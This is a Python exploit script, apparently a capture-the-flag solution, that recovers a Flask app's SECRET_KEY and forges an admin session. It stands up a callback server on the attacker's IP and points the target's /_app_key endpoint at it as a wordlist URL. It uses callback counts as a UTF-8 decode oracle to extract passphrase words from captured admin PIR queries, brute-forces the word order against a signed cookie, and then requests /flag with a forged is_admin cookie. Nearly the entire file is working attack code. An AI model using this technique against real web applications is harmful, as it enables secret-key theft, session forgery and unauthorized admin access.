"""
Flag 3 (admin): recover the admin passphrase = Flask SECRET_KEY, forge is_admin.

SECRET_KEY = generate_password(CLIENT_ADMIN, DEFAULT_WORDLIST), chosen once at boot
from six random dice rolls. Those rolls only exist in CLIENT_ADMIN's six setup
queries (grabbed from tmp/). /_app_key runs generate_password(CLIENT_ADMIN, ...)
with fresh rolls and discards the result by raising -- useless on its own, but it
still .decode()s every word, so a word that isn't valid UTF-8 raises a different
exception earlier. The number of callbacks our wordlist server receives before the
error tells us whether the decoded word was valid.

Database.process is deterministic and public, so for each captured admin query we
recompute process(query, DB') over a database we choose, and use the /_app_key
"valid UTF-8?" oracle to binary-search each secret index bit by bit. 11 bits per
word, 6 words -> 66 PIR evaluations. Each index -> wordlist[index] = one passphrase
word. Order is recovered offline against a genuine server-signed cookie, then we
forge {"is_admin": true} and hit /flag.

Usage: python admin.py <WEB_IP> <MY_VPN_IP> [PORT]   (needs grab_dump/ from grab.py)
"""
import glob, http.cookiejar, http.server, itertools, os, random, re, socketserver
import string, sys, threading, time, urllib.parse, urllib.request
import multiprocessing as mp
from pir import parse_query, process, serialize_response, HAVE_GMP
import flasksign

PIR_RESP = "X-Application-Private-Information-Retrieval-Response"
VALID = int.from_bytes(b"test", "little")      # any ascii word
INVALID = int.from_bytes(b"\x80", "little")    # lone UTF-8 continuation byte -> UnicodeDecodeError
NBITS = 11                                     # 2^11 = 2048 >= 1296 words


def entries_for_bit(b):
    if b is None:
        return [VALID] * 1296                  # all valid -> decodes everywhere, for key id
    return [INVALID if (i >> b) & 1 else VALID for i in range(1296)]

def _worker(args):
    n, selectors, b = args
    return serialize_response(process(n, selectors, entries_for_bit(b)))


def main():
    web_ip, my_ip = sys.argv[1], sys.argv[2]
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 9999
    web = f"http://{web_ip}:8081"

    current = [b""]
    counter = [0]
    lock = threading.Lock()

    class Server(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_POST(self):
            self.rfile.read(int(self.headers.get("Content-Length", 0)))
            with lock:
                counter[0] += 1
            self.send_response(200)
            self.send_header("Content-Type", PIR_RESP)
            self.send_header("Content-Length", str(len(current[0])))
            self.end_headers()
            self.wfile.write(current[0])

    socketserver.TCPServer.allow_reuse_address = True
    threading.Thread(target=lambda: socketserver.TCPServer(("0.0.0.0", port), Server).serve_forever(),
                     daemon=True).start()
    time.sleep(0.3)

    jar = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    def post(path, data, timeout=300):
        req = urllib.request.Request(web + path, urllib.parse.urlencode(data).encode(), method="POST")
        try:
            with op.open(req, timeout=timeout) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")

    def oracle(resp):
        """True if the admin client decodes resp to a valid word (all 6 callbacks happen)."""
        current[0] = resp
        with lock:
            counter[0] = 0
        post("/_app_key", {"wordlist": f"http://{my_ip}:{port}/wl"})
        with lock:
            return counter[0] >= 6

    queries = {os.path.basename(f)[:-6]: open(f, "rb").read() for f in glob.glob("grab_dump/*.query")}
    print(f"[*] {len(queries)} captured queries; gmpy2={HAVE_GMP}")
    groups = {}
    for b, q in queries.items():
        groups.setdefault(parse_query(q)[0], []).append(b)
    keys = sorted(groups, key=lambda n: -len(groups[n]))
    for i, n in enumerate(keys):
        print(f"    key#{i} {n.bit_length()} bits, {len(groups[n])} words")

    print("[*] identifying the admin key (one all-valid response per key)...")
    admin_n = None
    for n in keys:
        if len(groups[n]) < 6:
            continue
        _, sels, _ = parse_query(queries[groups[n][0]])
        if oracle(_worker((n, sels, None))):
            admin_n = n
            break
    if admin_n is None:
        print("[-] admin key not found -- is /_app_key reachable from the web box?")
        return
    print(f"[+] admin key: {admin_n.bit_length()} bits, {len(groups[admin_n])} words")

    wordlist = load_wordlist(web_ip)

    bases = groups[admin_n]
    sels = [parse_query(queries[b])[1] for b in bases]
    tasks = [(admin_n, sels[j], b) for j in range(len(bases)) for b in range(NBITS)]
    print(f"[*] computing {len(tasks)} PIR responses on {mp.cpu_count()} cores (slow part)...")
    t0 = time.time()
    with mp.Pool(mp.cpu_count()) as pool:
        resps = pool.map(_worker, tasks)
    print(f"[*] done in {time.time()-t0:.0f}s; running oracle...")

    words = []
    for j in range(len(bases)):
        idx = 0
        for b in range(NBITS):
            if not oracle(resps[j * NBITS + b]):
                idx |= 1 << b
        words.append(wordlist[idx])
        print(f"[+] word{j}: index {idx} -> {words[-1]!r}")

    secret = recover_order(words, post, jar)
    if not secret:
        print("[-] could not recover word order")
        return
    print(f"[+] SECRET_KEY = {secret!r}")

    cookie = flasksign.sign_session(secret, {"is_admin": True})
    req = urllib.request.Request(web + "/flag")
    req.add_header("Cookie", f"session={cookie}")
    try:
        body = urllib.request.urlopen(req, timeout=60).read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
    print("[+] flag:", re.findall(r"PP\{[^}]*\}", body) or body.strip())


def load_wordlist(web_ip):
    if os.path.exists("eff_short_wordlist_1.txt"):
        data = open("eff_short_wordlist_1.txt", "rb").read()
    else:
        data = urllib.request.urlopen(f"http://{web_ip}:8080/eff_short_wordlist_1.txt", timeout=30).read()
    words = [w.strip().decode() for w in data.split(b"\n") if w.strip()]
    assert len(words) == 1296, len(words)
    return words


def recover_order(words, post, jar):
    """The 6 words are a set; recover the real order against a server-signed cookie."""
    user = "o" + "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    post("/register", {"username": user, "password": "x"})
    cookie = next((c.value for c in jar if c.name == "session"), None)
    if not cookie:
        return None
    for perm in set(itertools.permutations(words)):
        cand = " ".join(perm)
        if flasksign.verify_key(cand, cookie):
            return cand
    return None


if __name__ == "__main__":
    mp.freeze_support()
    main()
